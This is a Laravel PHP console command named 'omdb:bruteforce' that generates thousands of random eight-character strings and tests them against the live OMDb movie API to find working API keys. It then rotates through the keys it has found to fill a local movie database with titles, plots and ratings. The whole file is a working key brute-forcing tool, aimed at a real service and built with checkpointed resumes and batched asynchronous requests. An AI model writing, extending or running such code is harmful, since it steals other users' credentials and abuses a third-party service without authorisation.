<?php

namespace App\Console\Commands;

use App\Models\Movie;
use App\Models\OmdbApiKey;
use Illuminate\Console\Command;
use Illuminate\Http\Client\Pool;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;

class OmdbBruteforceCommand extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'omdb:bruteforce';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Generate, validate API keys and parse movies automatically';

    /**
     * Execute the console command.
     */
    public function handle(): int
    {
        $this->components->info('Starting OMDB API Bruteforce System');
        $this->newLine();

        // Phase 1: Ensure we have keys to test
        $this->ensureKeysAvailable();

        // Phase 2: Validate pending keys with resume support
        $this->validatePendingKeys();

        // Phase 3: Parse movies with valid keys
        $this->parseMovies();

        $this->newLine();
        $this->components->info('OMDB Bruteforce System completed successfully!');

        return self::SUCCESS;
    }

    /**
     * Ensure we have enough pending keys to test.
     */
    protected function ensureKeysAvailable(): void
    {
        $this->components->task('Checking pending keys', function () {
            $pendingCount = OmdbApiKey::pending()->count();

            $minKeys = (int) config('services.omdb.bruteforce.min_pending_keys', 10000);

            if ($pendingCount >= $minKeys) {
                $this->info("Sufficient keys available ({$pendingCount} pending)");

                return;
            }

            $toGenerate = $minKeys - $pendingCount;
            $this->info("Generating {$toGenerate} new keys...");

            $charset = config('services.omdb.bruteforce.charset', '0123456789abcdefghijklmnopqrstuvwxyz');
            $keyLength = (int) config('services.omdb.bruteforce.key_length', 8);
            $batchSize = (int) config('services.omdb.bruteforce.generation_batch', 1000);

            $generated = 0;
            $bar = $this->output->createProgressBar($toGenerate);
            $bar->start();

            while ($generated < $toGenerate) {
                $keys = [];

                // Generate batch
                for ($i = 0; $i < min($batchSize, $toGenerate - $generated); $i++) {
                    $keys[] = [
                        'key' => $this->generateRandomKey($charset, $keyLength),
                        'status' => OmdbApiKey::STATUS_PENDING,
                        'first_seen_at' => now(),
                        'created_at' => now(),
                        'updated_at' => now(),
                    ];
                }

                // Insert batch (skip duplicates)
                DB::table('omdb_api_keys')->insertOrIgnore($keys);

                $generated += count($keys);
                $bar->advance(count($keys));
            }

            $bar->finish();
            $this->newLine();
            $this->components->info("Generated {$generated} keys");
        });

        $this->newLine();
    }

    /**
     * Validate pending keys using async HTTP requests with resume capability.
     */
    protected function validatePendingKeys(): void
    {
        $checkpoint = (int) Cache::get('omdb:checkpoint', 0);
        $this->components->info("Resuming validation from checkpoint: {$checkpoint}");

        $batchSize = (int) config('services.omdb.validation.batch_size', 50);
        $testImdbId = config('services.omdb.validation.test_imdb_id', 'tt3896198');
        $timeout = (int) config('services.omdb.validation.timeout', 10);

        $totalProcessed = 0;
        $totalValid = 0;
        $totalInvalid = 0;

        while (true) {
            $keys = OmdbApiKey::pending()
                ->where('id', '>', $checkpoint)
                ->orderBy('id')
                ->limit($batchSize)
                ->get();

            if ($keys->isEmpty()) {
                $this->components->info('All keys validated!');
                break;
            }

            $this->line(sprintf(
                'Validating batch of %d keys (IDs %d to %d)...',
                $keys->count(),
                $keys->first()->id,
                $keys->last()->id
            ));

            // Async validation using Http::pool()
            $responses = Http::pool(function (Pool $pool) use ($keys, $testImdbId, $timeout) {
                foreach ($keys as $key) {
                    $pool->as($key->id)
                        ->timeout($timeout)
                        ->get(config('services.omdb.base_url', 'http://www.omdbapi.com'), [
                            'i' => $testImdbId,
                            'apikey' => $key->key,
                        ]);
                }
            });

            // Process responses
            foreach ($keys as $key) {
                $response = $responses[$key->id];
                $result = $this->processValidationResponse($key, $response);

                if ($result === 'valid') {
                    $totalValid++;
                } elseif ($result === 'invalid') {
                    $totalInvalid++;
                }
            }

            $totalProcessed += $keys->count();

            // Update checkpoint
            $checkpoint = (int) $keys->last()->id;
            Cache::forever('omdb:checkpoint', $checkpoint);

            $this->components->info(sprintf(
                'Batch complete. Checkpoint: %d | Valid: %d | Invalid: %d | Total: %d',
                $checkpoint,
                $totalValid,
                $totalInvalid,
                $totalProcessed
            ));

            // Rate limit pause (1 second between batches)
            sleep(1);
        }

        $this->newLine();
        $this->components->info(sprintf(
            'Validation complete! Processed: %d | Valid: %d | Invalid: %d',
            $totalProcessed,
            $totalValid,
            $totalInvalid
        ));
        $this->newLine();
    }

    /**
     * Parse movies using valid API keys.
     */
    protected function parseMovies(): void
    {
        $validKeys = OmdbApiKey::valid()->pluck('key')->toArray();

        if (empty($validKeys)) {
            $this->components->warn('No valid API keys available for parsing.');

            return;
        }

        $this->components->info('Parsing movies with '.count($validKeys).' valid key(s)...');

        // Get movies that need OMDB data (movies without plot or with old data)
        $movies = Movie::query()
            ->where(function ($query) {
                $query->whereNull('plot')
                    ->orWhere('updated_at', '<', now()->subDays(30));
            })
            ->limit(1000) // Process up to 1000 movies per run
            ->get();

        if ($movies->isEmpty()) {
            $this->components->info('No movies need updating.');

            return;
        }

        $this->line("Found {$movies->count()} movies to update");

        $keyIndex = 0;
        $moviesProcessed = 0;
        $moviesUpdated = 0;

        $bar = $this->output->createProgressBar($movies->count());
        $bar->start();

        foreach ($movies->chunk(50) as $chunk) {
            $responses = Http::pool(function (Pool $pool) use ($chunk, $validKeys, &$keyIndex) {
                foreach ($chunk as $movie) {
                    $apiKey = $validKeys[$keyIndex % count($validKeys)];
                    $keyIndex++;

                    $pool->as($movie->id)
                        ->timeout(10)
                        ->get(config('services.omdb.base_url', 'http://www.omdbapi.com'), [
                            'i' => $movie->imdb_id,
                            'apikey' => $apiKey,
                        ]);
                }
            });

            foreach ($chunk as $movie) {
                $response = $responses[$movie->id];

                if ($this->updateMovieFromOmdb($movie, $response)) {
                    $moviesUpdated++;
                }

                $moviesProcessed++;
                $bar->advance();
            }

            // Rate limiting (1 second between batches)
            sleep(1);
        }

        $bar->finish();
        $this->newLine();
        $this->components->info("Movie parsing complete! Processed: {$moviesProcessed} | Updated: {$moviesUpdated}");
        $this->newLine();
    }

    /**
     * Generate a random API key.
     */
    protected function generateRandomKey(string $charset, int $length): string
    {
        $key = '';
        $max = strlen($charset) - 1;

        for ($i = 0; $i < $length; $i++) {
            $key .= $charset[random_int(0, $max)];
        }

        return $key;
    }

    /**
     * Process validation response and update key status.
     */
    protected function processValidationResponse(OmdbApiKey $key, $response): string
    {
        // Handle exceptions from HTTP pool
        if ($response instanceof \Exception) {
            $key->update([
                'status' => OmdbApiKey::STATUS_UNKNOWN,
                'last_checked_at' => now(),
            ]);

            return 'unknown';
        }

        if ($response->successful()) {
            $data = $response->json();

            if (isset($data['Response']) && $data['Response'] === 'True') {
                $key->update([
                    'status' => OmdbApiKey::STATUS_VALID,
                    'last_checked_at' => now(),
                    'last_confirmed_at' => now(),
                    'last_response_code' => $response->status(),
                ]);

                $this->components->info("✓ Valid key: {$key->key}");

                return 'valid';
            }

            if (str_contains(strtolower($data['Error'] ?? ''), 'invalid api key')) {
                $key->update([
                    'status' => OmdbApiKey::STATUS_INVALID,
                    'last_checked_at' => now(),
                    'last_response_code' => $response->status(),
                ]);

                return 'invalid';
            }
        }

        $key->update([
            'status' => OmdbApiKey::STATUS_UNKNOWN,
            'last_checked_at' => now(),
            'last_response_code' => $response->status(),
        ]);

        return 'unknown';
    }

    /**
     * Update movie with OMDB data.
     */
    protected function updateMovieFromOmdb(Movie $movie, $response): bool
    {
        // Handle exceptions from HTTP pool
        if ($response instanceof \Exception) {
            return false;
        }

        if (! $response->successful()) {
            return false;
        }

        $data = $response->json();

        if (! isset($data['Response']) || $data['Response'] !== 'True') {
            return false;
        }

        $movie->update([
            'title' => $data['Title'] ?? $movie->title,
            'year' => $data['Year'] ?? $movie->year,
            'plot' => $data['Plot'] ?? $movie->plot,
            'poster_path' => $data['Poster'] ?? $movie->poster_path,
            'vote_average' => $data['imdbRating'] ?? $movie->vote_average,
        ]);

        return true;
    }
}
